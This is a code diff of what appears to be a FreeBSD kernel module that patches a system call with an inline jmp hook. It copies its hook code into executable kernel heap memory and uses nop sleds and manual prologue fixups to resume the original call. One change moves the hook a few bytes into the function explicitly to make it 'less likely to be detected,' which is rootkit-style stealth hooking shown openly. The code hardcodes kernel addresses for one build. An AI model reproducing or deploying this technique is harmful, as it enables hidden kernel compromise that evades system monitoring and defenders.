@@ -34,6 +34,29 @@ new_sy_call(struct thread *td, void *syscall_args) {
         mode_t mode;
     };
 
+    // nop sled where the jmp from old_sy_call will land.
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+    __asm__ volatile ("nop");
+
+    // since we reach this function by jmping from old_sy_call to the nop sled,
+    // our function's (new_sy_call's) function prologue wouldn't have been executed.
+    // we need to manually set up this function's (new_sy_call's) function prologue.
+    //
+    // since the jmphook is placed a few instruction bytes into old_sy_call,
+    // "push %ebp" and "mov %esp, %ebp" would have been executed by old_sy_call.
+    // __asm__ volatile ("push %ebp");
+    // __asm__ volatile ("mov %esp, %ebp");
+    __asm__ volatile ("push %edi");
+    __asm__ volatile ("push %esi");
+    __asm__ volatile ("movl 0xc(%ebp), %edi");
+    __asm__ volatile ("movl 0x8(%ebp), %esi");
+
     // dummyret() down below causes the compiler to move td and
     // syscall_args to registers esi and edi.
 
@@ -43,7 +66,7 @@ new_sy_call(struct thread *td, void *syscall_args) {
 
     // push old_sy_call's return address.
     get_pc_ecx(); // get program counter and place into ecx.
-    __asm__ volatile ("addl $50, %ecx"); // make ecx point to the nop sled below.
+    __asm__ volatile ("addl $35, %ecx"); // make ecx point to the nop sled below.
     __asm__ volatile ("push %ecx"); // push ecx as old_sy_call's return address.
 
     // execute the instruction bytes of old_sy_call that were overwritten when
@@ -52,10 +75,11 @@ new_sy_call(struct thread *td, void *syscall_args) {
     __asm__ volatile ("mov  %esp, %ebp");
     __asm__ volatile ("push %edi");
     __asm__ volatile ("push %esi");
+    __asm__ volatile ("movl 0xc(%ebp), %edi");
 
-    // the following trick jmps to old_sy_call+5 (old_sy_call: 0xc0c42820).
+    // the following trick jmps to old_sy_call+8 (old_sy_call: 0xc0c42820).
     // this achieves an absolute jmp.
-    __asm__ volatile ("movl $0xc0c42825, %ecx");
+    __asm__ volatile ("movl $0xc0c42828, %ecx");
     __asm__ volatile ("push %ecx");
     // dummyret() prevents code below from being optimized out by the compiler.
     int retval = dummyret(td, syscall_args);
@@ -65,32 +89,6 @@ new_sy_call(struct thread *td, void *syscall_args) {
     }
 
     // nop sled where old_sy_call will return to.
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
-    __asm__ volatile ("nop");
     __asm__ volatile ("nop");
     __asm__ volatile ("nop");
     __asm__ volatile ("nop");
@@ -195,13 +193,15 @@ load(struct module *module, int cmd, void *arg) {
         // the malloc region surprisingly has execute permissions.
         char *malloc_addr = malloc(256ul, M_TEMP, M_NOWAIT | M_USE_RESERVE);
 
+        // jmp from old_sy_call + 3 to malloc_addr + 16 to make it less likely
+        // to be detected.
         uint8_t jmphook[5];
-        craft_jmphook(jmphook, old_sy_call, malloc_addr);
-        overwrite_jmphook(jmphook, old_sy_call);
+        craft_jmphook(jmphook, old_sy_call + 3, malloc_addr + 16);
+        overwrite_jmphook(jmphook, old_sy_call + 3);
 
         // copy the instruction bytes in new_sy_call (the hook) to the malloc region.
         char *new_sy_call_addr = (char *)new_sy_call;
-        for (unsigned int i = 0; i < 256; i++) {
+        for (unsigned int i = 0; i < 256u; i++) {
 
             // if we hit a page boundary, break out because
             // the permissions may not be the same across different pages.
